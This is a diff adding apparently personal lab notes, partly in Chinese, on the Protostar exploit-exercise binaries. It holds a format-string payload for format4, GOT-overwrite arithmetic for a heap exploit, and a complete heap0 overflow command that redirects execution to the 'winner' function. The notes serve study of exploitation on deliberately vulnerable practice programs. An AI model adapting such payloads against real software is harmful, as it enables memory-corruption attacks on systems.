@@ -344,3 +344,29 @@ hello
 python -c 'import sys; sys.stdout.write("\x26\x97\x04\x08\x24\x97\x04\x08%02044x%4$hn%31920x%5$hn")' > input4
 env -i PWD=$(pwd) cat /tmp/input4 |./format4
 ```
+
+##Heap Exploit 
+
+`readelf --relocs example`读GOT表
+
+buf1 = 0x804a008
+buf2 = 0x804a110  264
+free = 0x080496e0 - 8
+0x80496d8- 0x804a110  
+0x080496e0 - 0x804a110  = fffff5d0
+'\xd0\xf5\xff\xff'
+fffff5c8
+
+`python -c 'print "A"*260 + "\xff\xff\xff\xff"'` fffff5c8 AAAA
+
+##Heap0
+
+```
+d = 0x804a008
+f = 0x804a050
+d的容量是64,为何相差72,剩余的8个用来做什么？
+winner = 0x08048464
+
+/opt/protostar/bin/heap0 `python -c 'import sys; sys.stdout.write("A"*72+"\x64\x84\x04\x08")'`
+```
+
